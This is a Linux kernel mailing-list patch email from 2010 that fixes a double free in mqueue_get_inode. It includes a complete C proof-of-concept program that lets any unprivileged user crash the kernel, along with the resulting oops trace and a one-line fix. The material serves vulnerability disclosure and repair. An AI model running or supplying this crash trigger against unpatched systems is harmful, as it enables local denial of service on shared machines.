Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1755827Ab0EJJ2f (ORCPT <rfc822;w@1wt.eu>);
	Mon, 10 May 2010 05:28:35 -0400
Received: from mail-gy0-f174.google.com ([209.85.160.174]:50306 "EHLO
	mail-gy0-f174.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1755810Ab0EJJ2b (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Mon, 10 May 2010 05:28:31 -0400
DomainKey-Signature: a=rsa-sha1; c=nofws;
        d=gmail.com; s=gamma;
        h=from:to:cc:subject:date:message-id:x-mailer:mime-version
         :content-type:content-transfer-encoding;
        b=iS5Y7/Ho0RJ9IrzSTvuTHPWZSCYk+7jvXs2n6X1jkdFuTZM4bb1wK3fwEWSsqeyOvf
         rZVUD5jeL2iEv2oDFeF8KH6ukWj1d62fw8Bz2c6veYaDwPzoKuHIkoOU2UEkxSmAYMf4
         kmrVASvVTdkEAvxi2mMJ3qckXoKgni1JnjA6o=
From: =?UTF-8?q?Andr=C3=A9=20Goddard=20Rosa?= <andre.goddard@gmail.com>
To: Al Viro <viro@zeniv.linux.org.uk>,
       Andrew Morton <akpm@linux-foundation.org>,
       Alexey Dobriyan <adobriyan@gmail.com>,
       Sanchin Sant <sanchinp@in.ibm.com>, linux-kernel@vger.kernel.org
Cc: =?UTF-8?q?Andr=C3=A9=20Goddard=20Rosa?= <andre.goddard@gmail.com>
Subject: [PATCH] mqueue: fix kernel BUG caused by double free() on mq_open()
Date: Sun,  9 May 2010 06:22:28 -0300
Message-Id: <17ea945f6d53443000524eb7cc5c4fc66ee3ecf8.1273396690.git.andre.goddard@gmail.com>
X-Mailer: git-send-email 1.7.1.78.g212f0
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

In case of aborting because we reach the maximum amount of memory
which can be allocated to message queues per user (RLIMIT_MSGQUEUE),
we would try to free the message area twice when bailing out.

It can be triggered by any unprivileged user with the following program:

/*
 * This program causes a Linux kernel BUG by any unprivileged user.
 * Compile and run it with:
 * 	$ gcc main_mqueue_BUG.c -lrt; ./a.out
 */
#include <stdio.h>
#include <stdlib.h>
#include <mqueue.h>
#include <string.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <sys/resource.h>

#define MAX_TRIES		32
#define NAMESIZE		32
#define NEW_MQ_MEM_LIMIT	16384
#define BUFFER			8192
#define MAXMSG			10
#define MQUEUE_NAME_PATTERN	"/main_mqueue_BUG_%d"

int main()
{
	char qname[NAMESIZE];
	struct mq_attr attr;
	struct rlimit new_rlimit;
	int i = 0;

	new_rlimit.rlim_cur = NEW_MQ_MEM_LIMIT;
	new_rlimit.rlim_max = NEW_MQ_MEM_LIMIT;
	if (setrlimit(RLIMIT_MSGQUEUE, &new_rlimit) != 0) {
		perror("Failed BUG exploit! setrlimit() didn't return success");
		return EXIT_FAILURE;
	}
	attr.mq_msgsize = BUFFER;
	attr.mq_maxmsg  = MAXMSG;
	do {
		snprintf(qname, sizeof(qname), MQUEUE_NAME_PATTERN, i);
		/* We're leaking the userspace fd (and kernel memory) here on purpose... */
		if (mq_open(qname, O_CREAT |O_RDWR, S_IRUSR | S_IWUSR, &attr) == (mqd_t)-1)
			perror("Did we BUG already? mq_open() didn't return success");
	} while (++i < MAX_TRIES);
	printf("%s\n", "If the BUG didn't happen yet, it should happen real soon... Check dmesg!");

	return EXIT_SUCCESS;
}

BUG listing:
------------

kernel BUG at mm/slub.c:2846!
invalid opcode: 0000 [#1] PREEMPT SMP
last sysfs file: /sys/devices/system/cpu/cpu1/cache/index2/shared_cpu_map
CPU 0
Modules linked in: nfs lockd nfs_acl auth_rpcgss sunrpc vboxnetadp vboxnetflt vboxdrv af_packet snd_pcm_oss snd_mixer_oss snd_seq snd_seq_device edd ipv6 cpufreq_conservative cpufreq_userspace cpufreq_powersave acpi_cpufreq binfmt_misc fuse loop arc4 snd_hda_codec_idt ecb iwl3945 snd_hda_intel iwlcore snd_hda_codec uvcvideo snd_hwdep snd_pcm videodev mac80211 snd_timer v4l1_compat snd v4l2_compat_ioctl32 i2c_i801 ide_cd_mod cfg80211 soundcore video sony_laptop snd_page_alloc rfkill i2c_core cdrom output sg joydev serio_raw pcspkr ac battery button usbhid hid sd_mod uhci_hcd ahci libata rtc_cmos rtc_core rtc_lib scsi_mod ehci_hcd usbcore fan processor piix ide_core thermal thermal_sys hwmon

Pid: 2743, comm: a.out Not tainted 2.6.34-rc7-3.2-default #252 VAIO/VGN-FZ15L
RIP: 0010:[<ffffffff810c94d1>]  [<ffffffff810c94d1>] kfree+0xa1/0xb0
RSP: 0018:ffff880073321dc8  EFLAGS: 00010246
RAX: ffffea000191ca00 RBX: ffff880073150708 RCX: ffff8800731503a8
RDX: 4000000000080000 RSI: ffffffff81609520 RDI: ffff880072cc0000
RBP: ffff880072cc0000 R08: 00000000000004c0 R09: 0000000000000001
R10: ffff880001622550 R11: ffff880073150700 R12: ffff880073150708
R13: ffffffff814f84e0 R14: 00000000000fde80 R15: ffff880073150700
FS:  00007fd6845616f0(0000) GS:ffff880001800000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007fd684194fe0 CR3: 000000007e0a4000 CR4: 00000000000006f0
DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
Process a.out (pid: 2743, threadinfo ffff880073320000, task ffff88007dd5f800)
Stack:
0000000000000040 ffff880073150708 ffff880073150700 ffffffff811e0012
<0> ffff880073150708 ffffffff813cb200 ffffffff814f0820 0000000000124f80
<0> 00000000000fde80 ffffffff810e47ec ffff880073150708 0000000000000000
Call Trace:
[<ffffffff811e0012>] ? mqueue_delete_inode+0x92/0x120
[<ffffffff810e47ec>] ? generic_delete_inode+0x8c/0x130
[<ffffffff811e0322>] ? mqueue_get_inode+0x282/0x290
[<ffffffff811e0430>] ? mqueue_create+0x90/0x190
[<ffffffff810d8eec>] ? vfs_create+0xac/0xd0
[<ffffffff811e0ae2>] ? sys_mq_open+0x5b2/0x710
[<ffffffff81002eab>] ? system_call_fastpath+0x16/0x1b
Code: 5d c3 48 89 ea 48 89 c6 e8 ed fa ff ff eb ea 66 f7 c2 00 c0 74 15 41 5b 48 89 c7 5b 5d e9 c8 75 fd ff 48 8b 40 10 48 8b 10 eb 90 <0f> 0b eb fe 66 66 2e 0f 1f 84 00 00 00 00 00 48 83 ec 08 48 81

Signed-off-by: André Goddard Rosa <andre.goddard@gmail.com>
---
 ipc/mqueue.c |    1 +
 1 files changed, 1 insertions(+), 0 deletions(-)

diff --git a/ipc/mqueue.c b/ipc/mqueue.c
index 722b013..77a3c8e 100644
--- a/ipc/mqueue.c
+++ b/ipc/mqueue.c
@@ -159,6 +159,7 @@ static struct inode *mqueue_get_inode(struct super_block *sb,
 			    task_rlimit(p, RLIMIT_MSGQUEUE)) {
 				spin_unlock(&mq_lock);
 				kfree(info->messages);
+				info->messages = NULL;
 				goto out_inode;
 			}
 			u->mq_bytes += mq_bytes;
-- 
1.7.1.78.g212f0

